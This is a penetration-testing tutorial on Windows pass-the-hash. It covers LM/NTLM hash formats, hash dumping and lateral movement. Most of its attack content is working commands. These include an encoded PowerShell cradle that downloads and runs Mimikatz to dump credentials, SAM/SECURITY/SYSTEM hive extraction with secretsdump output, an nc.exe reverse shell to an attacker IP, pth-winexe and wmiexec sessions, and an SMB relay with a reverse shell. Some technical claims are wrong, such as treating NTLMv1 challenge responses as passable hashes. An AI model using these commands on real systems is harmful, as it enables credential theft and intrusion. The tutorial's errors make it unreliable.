# Pass-The-Hash Windows

In most case of leathral movment, we usually don't have password. 
This PTH technique, allows us to authenticate to a remote target by using a valid username and NTLM/LM hash rather than username and password. First let's understand the diffrences between LM,NTLM and NTLMv1/v2 hashes:

## Lan Manager (LM) Hashes

The oldest password storage used by Windows. In Windows 2000, XP and Server 2003 passwords shorter than 15 characters were stored in the Lan Manager (LM) hash format as following:

```
user:group:id:lmhash:nthash::
```

For example:

```
 Admin:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::
```

This hash divided by semicolon, means:

- Admin is the user name

- 502 is the relative identifier (500 is an administrator, 502 here is a kerberos account. (adsecurity.org/?p=483)

- aad3c435b514a4eeaad3b935b51304f is the LM hash

- c46b9e588fa0d112de6f59fd6d58eae3 is the NT hash 


Our final NTLM hash for brute force attack will be *aad3c435b514a4eeaad3b935b51304fe*
For online cracking use: https://hashkiller.co.uk/Cracker/NTLM

## NT (New Technology) Hashes

In newer Windows versions (such as Vista, Server 2008+, Win7 etc.) this is the way passwords are stored, also those hashes are stored on domain controllers in the NTDS file and commonly use for pass-the-hash. This commonly use in term of NTLM hash (or just NTLM).

NTLM hash with only the NT component format as following:

```
user:group:id:emptylmhash:nthash::
```

For example:

```
Administrator:500:NO PASSWORD*********************:EC054D40119570A46634350291AF0F72:::
ITguy:1007:AAD3B435B51404EEAAD3B435B51404EE:38103E9BF8D09200D725F1541ECC5BCA:::
```

In both cases, it is the same format. However, the string "NO PASSWORD" or "AAD3B435B51404EEAAD3B435B51404EE" display in place of no password depend on the tool being used to dump those hashes as normally LM hash is empty and not stored. NTLM hash can be cracked to gain password, or used to pass-the-hash.

For online cracking use: https://hashkiller.co.uk/Cracker/NTLM

## NTLMv1/v2

Those NTLMv1/v2 are challenge response protocols used for authentication in Windows environments, much harder to bruteforce and usually used in SMB relay attack using Responder.py or Impacket Python tools to obtains this hash from a client in the network.

NTLMv1-SSP hash format as following:

```
username::hostname:*response*:*response*:challenge
```

For example:

```
john::MWLAB:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

We will use the response characters from the hash string as our final hash for pass-the-hash:

```
38d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41
```

Then, use this hash on one of pth (pass-the-hash) tools for example wmiexec from Impacket:

```
root@kali:~# wmiexec.py  -hashes 38d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41 administrator@192.168.1.12
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

## Dump Hashes

### Using FgDump.exe tool

Dump hashes from running system using fgdump.exe from Kali as following:

```
root@kali:~# cd /usr/share/windows-binaries/fgdump
root@kali:/usr/share/windows-binaries/fgdump# python -m SimpleHTTPServer 80
```

### Using powershell mimikatz

Use the newer version of Invoke-Mimikatz, available in Empire 3.0 on the victim machine:

```
C:\> powershell -c "IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;"
```

*For Windows 10:*

Encode the command using the following trick in you Kali machine:

```
root@kali:~# iconv -f ASCII -t UTF-16LE <<<'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1"); $m = Invoke-Mimikatz -DumpCreds; $m' | base64 -w 0
```

It will output:

```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG...
```

Then use it in your powershell command:

```
C:\> powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG...
```

### From Compromised system

If we already compromised system, then we able extract the values of SAM files from you system and then dump thier hashes in your kali machine:

On victim machine (has to run under SYSTEM-level privileges):

```
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save

```

Then use those copy of the SYSTEM, SECURITY and SAM hives back to your kali machien and use secretsdump.py to dump hashes:


```
root@kali:~# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies

[*] Target system bootKey: 0x602e8c2947d56a95bf9cfad9e0bbbace
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
renadm:500:aad3b435b51404eeaad3b435b51404ee:3e24dcead23468ce597d6883c576f657:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
support:1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
hdes:6ec74661650377df488415415bf10321:securus.corp.com:SECURUS:::
Administrator:c4a850e0fee5af324a57fd2eeb8dbd24:SECURUS.CORP.COM:SECURUS:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f
...

```

## Practical Usage PTH

### Execute as another user

Let's say you already have an admin account in network but you want to execute process under this account on antoher machine in network (like run-as). The following script may help:

```
$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$ computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

### Pth-winexe

This help us to get an interactive command line with the remote victim:

USAGE:

```
pth-winexe -U DOMAIN/user%hash //$ip cmd
```

Example:
```
root@kali:~# pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.12 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows \[Version 6.3.9600\]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
Server\Administrator
```

### SMB Relaying attack

Fire up the Responder.py tool:

```
root@kali:~# python Responder.py -I eth1 -r -d -w
```

In another window running the following command using Impacket Python:

```
root@kali:~# ntlmrelayx.py -tf targets.txt -c [POWERSHELL REVERSE SHELL]
```

Upon successful relay it will dump the SAM database of the target and executing a command in background using the NTLM hash.

